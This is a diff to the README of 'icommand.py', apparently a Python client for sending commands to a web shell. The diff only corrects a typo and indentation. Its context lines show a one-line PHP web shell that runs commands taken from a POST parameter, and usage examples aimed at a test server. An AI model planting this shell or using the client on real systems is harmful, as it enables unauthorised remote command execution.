@@ -10,8 +10,8 @@ It sends requests to the server through urllib/urllib2 [Python][] modules
 	- `<?php system($_POST['cmd']); ?>`
 
 ### Usage: ###
-- --url is a positional argument withing GET and POST requests:  
-	python icommand.py --url http://testserver.com/shell.php?cmd=  
+- --url is a positional argument within GET and POST requests:  
+  python icommand.py --url http://testserver.com/shell.php?cmd=  
   python icommand.py --url http://testserver.com/shell.php --method POST --parameter cmd
 
 [Python]: http://www.python.org/download/
